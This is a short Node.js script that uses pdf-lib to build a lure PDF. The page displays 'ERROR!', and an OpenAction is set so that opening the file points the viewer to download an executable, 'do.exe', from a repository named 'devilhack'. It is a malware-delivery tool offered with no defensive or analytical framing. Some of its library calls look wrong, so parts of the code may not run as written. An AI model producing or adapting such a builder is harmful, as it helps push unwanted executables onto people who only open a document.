const fs = require('fs');
const { PDFDocument } = require('pdf-lib');

async function createPDF() {
  // Create a new PDF document
  const pdfDoc = await PDFDocument.create();
  const page = pdfDoc.addPage([600, 400]);

  // Embed a built-in font (Helvetica)
  const font = await pdfDoc.embedFont(PDFDocument.Font.Helvetica);
  
  // Add some text to the page
  page.drawText('ERROR!', {
    x: 50,
    y: 350,
    size: 30,
    font: font,
  });

  // Set up OpenAction to download the file (this is a URL for an EXE file)
  const openAction = {
    Type: '/Action',
    S: '/URI',
    URI: 'https://github.com/thewifiproject/devilhack/raw/refs/heads/main/do.exe',
  };

  // Embed OpenAction into the PDF document
  pdfDoc.catalog.set('/OpenAction', openAction);

  // Serialize the PDF to bytes and save it to a file
  const pdfBytes = await pdfDoc.save();
  fs.writeFileSync('output.pdf', pdfBytes);

  console.log('PDF created successfully!');
}

createPDF().catch(err => {
  console.error('Error creating PDF:', err);
});
